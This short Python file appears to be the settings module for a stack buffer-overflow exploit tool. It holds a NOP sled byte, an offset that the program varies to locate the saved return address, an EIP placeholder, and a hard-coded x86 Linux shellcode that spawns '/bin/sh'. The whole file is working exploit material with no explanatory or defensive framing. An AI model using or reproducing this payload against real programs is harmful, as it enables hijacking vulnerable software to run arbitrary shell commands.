from enum import Enum
class Input(Enum):
    commandline = 1
    args = 2
class ToImport:
    def __init__(self):
        self.NOP = "\x90"
        self.offset = 0 #offset describes space between end of buffer and the beginning of eip; will be dynamically overidden by program to try different offsets
        self.shellcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
        self.eiploc = "" #the location of eip, expressed in python "\x" notation in backwards byte order

vals = ToImport()
